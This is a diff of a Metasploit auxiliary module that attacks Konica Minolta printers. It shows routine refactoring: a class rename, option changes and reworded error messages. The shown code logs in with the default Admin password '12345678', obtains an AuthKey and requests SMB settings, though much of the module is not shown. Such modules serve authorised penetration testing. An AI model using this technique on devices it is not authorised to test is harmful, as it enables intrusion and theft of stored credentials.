@@ -1,12 +1,11 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -30,11 +29,11 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT('50001'),
-        OptString.new('USER', [false, 'The default Admin user', 'Admin']),
+        OptString.new('USER', [true, 'The default Admin user', 'Admin']),
         OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
 
-      ], self.class)
+      ])
   end
 
   # Creates the XML data to be sent that will extract AuthKey
@@ -131,7 +130,7 @@ class Metasploit3 < Msf::Auxiliary
       'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
     }, datastore['TIMEOUT'].to_i)
     if response.nil?
-      print_error("#{peer} - No reponse from device")
+      print_error("No reponse from device")
       return
     else
       xml0_body = ::Nokogiri::XML(response.body)
@@ -143,7 +142,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     rescue ::Rex::ConnectionError
-      print_error("#{peer} - Version check Connection failed.")
+      print_error("Version check Connection failed")
   end
 
   # This section logs on and retrieves AuthKey token
@@ -158,7 +157,7 @@ class Metasploit3 < Msf::Auxiliary
         'data'   => authreq_xml.to_xml
       }, datastore['TIMEOUT'].to_i)
       if response.nil?
-        print_error("#{peer} - No reponse from device")
+        print_error("No reponse from device")
         return
       else
         xml1_body = ::Nokogiri::XML(response.body)
@@ -167,7 +166,7 @@ class Metasploit3 < Msf::Auxiliary
         extract(major, minor, authkey)
       end
     rescue ::Rex::ConnectionError
-      print_error("#{peer} - Login Connection failed.")
+      print_error("Login Connection failed")
     end
   end
 
@@ -185,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
           'data'   => smbreq_xml.to_xml
         }, datastore['TIMEOUT'].to_i)
         if response.nil?
-          print_error("#{peer} - No reponse from device")
+          print_error("No reponse from device")
           return
         else
           xml2_body = ::Nokogiri::XML(response.body)
@@ -221,7 +220,7 @@ class Metasploit3 < Msf::Auxiliary
       end
 
     else
-      print_status('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
+      print_error('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
       return
     end
   end
